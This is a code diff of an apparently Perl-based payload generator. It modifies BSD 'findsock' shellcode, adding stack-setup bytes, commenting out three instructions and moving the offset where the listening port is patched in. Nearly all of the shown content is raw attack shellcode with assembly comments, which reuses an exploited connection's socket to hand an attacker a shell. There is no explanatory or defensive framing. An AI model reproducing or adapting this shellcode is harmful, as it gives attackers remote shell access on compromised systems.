@@ -37,15 +37,20 @@ sub Generate
 {
     my $self = shift;
     my $port = shift;
-    my $off_port = 32;
+    my $off_port = 35;
     my $port_bin = pack("n", $port);
 
-    my $shellcode = # bsd findsock code by lsd
-
+    my $shellcode = # bsd findsock code by lsd (mod by hdm)
+    # clear some stack space
+    "\x81\xec\x00\x02\x00\x00" . # sub esp, 512
+    "\x89\xe7"                 . # mov edi, esp
+    
     # char findsckcode[]=    # /* 59 bytes                       */
-    "\x56"                 . # /* pushl   %esi                   */
-    "\x5f"                 . # /* popl    %edi                   */
-    "\x83\xef\x7c"         . # /* subl    $0x7c,%edi             */
+    
+    #"\x56"                 . # /* pushl   %esi                   */
+    #"\x5f"                 . # /* popl    %edi                   */
+    #"\x83\xef\x7c"         . # /* subl    $0x7c,%edi             */
+    
     "\x57"                 . # /* pushl   %edi                   */
     "\xb0\x10"             . # /* movb    $0x10,%al              */
     "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
@@ -125,6 +130,7 @@ sub Generate
     "\xcd\x80"             ; # /* int     $0x80                  */
 
     substr($shellcode, $off_port, 2, $port_bin);
+
     return $shellcode;
 }
 
